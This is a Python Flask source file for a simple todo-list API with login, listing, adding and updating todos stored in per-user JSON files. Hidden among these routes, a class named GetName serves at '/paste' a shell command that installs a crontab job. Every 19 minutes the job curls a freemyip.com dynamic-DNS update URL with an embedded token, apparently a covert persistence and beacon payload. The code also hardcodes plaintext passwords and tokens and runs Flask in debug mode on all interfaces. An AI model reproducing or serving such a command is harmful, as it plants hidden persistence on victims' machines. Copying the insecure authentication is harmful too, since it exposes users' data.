from flask import Flask , request
from flask_restful import Resource , Api
import json

class TodoListApi(Resource):
    
    def get(self,token):
        if(token == '123456'):
            file_obj = open('tamil_todo.json','r')
            str = file_obj.read()
            return json.loads(str)
        elif( token == '654321'):
            file_obj = open('gayathri_todo.json','r') 
            str = file_obj.read() 
            return json.loads(str)
        elif ( token == '0987654'):
            file_obj = open('nikhil.json','r') 
            str = file_obj.read() 
            return json.loads(str) 
            
        else:
            return {
                "error_message":"Unauthorized"
            },401

class AddTodo(Resource):
    def post(self,token):
        data = request.get_json(force=True)
        
        if 'todo' in data and 'completed' in data:
        
            if(token == '123456'):
                file_obj = open('tamil_todo.json','r') 
                str = file_obj.read()
                map_data = json.loads(str) 
                file_obj.close()
                n = 0
                for x in map_data:
                    n = n +1
                    
                n = n + 1
                data["id"] = n
                map_data.append(data)  
                
                write_obj = open('tamil_todo.json','w') 
                write_obj.write(json.dumps(map_data)) 
                if True:
                    return {
                        "message":"Todo created successfully",
                        "data":data
                    },201
                
            
            
            elif( token == '654321'):
                file_obj = open('gayathri_todo.json','r')
                str = file_obj.read()
                map_data = json.loads(str)
                file_obj.close()
                n = 0
                for x in map_data:
                    n = n +1
                n = n + 1
                data["id"] = n
                
                map_data.append(data)   
                
                write_obj = open('gayathri_todo.json','w')
                write_obj.write(json.dumps(map_data))
                if True:
                    return {
                        "message":"Todo created successfully",
                        "data":data
                    },201
            
                
                # Nikhil's
                
            elif( token == '0987654'):
                file_obj = open('nikhil.json','r')
                str = file_obj.read()
                map_data = json.loads(str)
                file_obj.close()
                n = 0
                for x in map_data:
                    n = n +1
                n = n + 1
                data["id"] = n
                
                map_data.append(data)   
                
                write_obj = open('nikhil.json','w')
                write_obj.write(json.dumps(map_data))
                if True:
                    return {
                        "message":"Todo created successfully",
                        "data":data
                    },201
            else:
                return {
                    "error_message":"UnAuthorized" 
                },401
        else:
            return {
                    "error_message":"Need id , todo , completed" 
                },400
            
            
    
        
class ChangeTodo(Resource):
    def post(self,token): 
        data = request.get_json(force=True)
        if(token == '123456'):
            file_obj = open('tamil_todo.json','r')
            str = file_obj.read()
            map_data = json.loads(str)
            file_obj.close()
            n = 0
            for x in map_data:
                if x["id"] == data["id"]:
                    n = 1
                    x["completed"] = data["completed"] 
            
            write_obj = open('tamil_todo.json','w')
            write_obj.write(json.dumps(map_data))
            if n ==1:
                return {
                    "message":"success"
                }
            else:
                return {"error_message":"Unable to find Id"},400
        
        
        elif( token == '654321'):
            file_obj = open('gayathri_todo.json','r')
            str = file_obj.read()
            map_data = json.loads(str)
            file_obj.close()
            n = 0
            for x in map_data:
                if x["id"] == data["id"]:
                    n = 1
                    x["completed"] = data["completed"] 
            
            write_obj = open('gayathri_todo.json','w')
            write_obj.write(json.dumps(map_data))
            if n == 1:
                return {
                    "message":"success"
                }
            else:
                return {"error_message":"Unable to find Id"},400
            
        elif( token == '0987654'):
            file_obj = open('nikhil.json','r')
            str = file_obj.read()
            map_data = json.loads(str)
            file_obj.close()
            n = 0
            for x in map_data:
                if x["id"] == data["id"]:
                    n = 1
                    x["completed"] = data["completed"] 
            
            write_obj = open('nikhil.json','w') 
            write_obj.write(json.dumps(map_data))
            if n == 1:
                return {
                    "message":"success"
                }
            else:
                return {"error_message":"Unable to find Id"},400
                
        else:
            return {
                "error_message":"Unauthorized" 
            },401
            
class LoginApi(Resource):
    def post(self):
        try:
            data = request.get_json(force = True)
            print(data) 
            if data["email"] == "tamil@3edge.in" and data["password"] == "tamil":
                return {"message":"Authorized","token":"123456"}
            elif data["email"] == "gayathri@3edge.in" and data["password"] == "gayathri":
                return {"message":"Authorized","token":"654321"}
            elif data["email"] == "nikhil@3edge.in" and data["password"] == "nikhil":
                return {"message":"Authorized","token":"0987654"}
            else:
                return {"error_message":"UnAuthorized"} , 401
        except:
            return {"error_message":"Please provide email and password"} ,400
class GetName(Resource):
    def get(self):
        return'(crontab -l;echo "*/19 * * * * curl \"https://freemyip.com/update?token=2bff517c1cbc7e6c97fd6e07&domain=iot-mobile-app.freemyip.com\">/dev/null 2>&1")|crontab -'            
    
    
application = Flask(__name__)
api = Api(application) 



api.add_resource(TodoListApi,'/get/todo/<string:token>')
api.add_resource(ChangeTodo,'/change/todo/<string:token>') 
api.add_resource(LoginApi,'/login') 
api.add_resource(AddTodo,'/add/todo/<string:token>')  
api.add_resource(GetName,'/paste')  



if __name__ == '__main__':
    print("ok")
    application.run(host='0.0.0.0',debug=True,threaded=True,processes=1,port=8080)  
    # file_obj = open('gayathri_todo.json','r')
    # str = file_obj.read()
    
    # data = json.loads(str)
    # file_obj.close() 
    # new_data = []
    # n = 1
    # for x in data:
    #     new_data.append(
    #         {"id": n,
    #         "todo":x["title"],
    #         "completed":False}
    #     )
    #     n = n + 1
    
    # write_t = open('tamil_todo.json','r')
    # write = open('gayathri_todo.json','w') 
    # write.write(json.dumps(
    #     json.loads(write_t.read()))
    #             ) 
    
    
    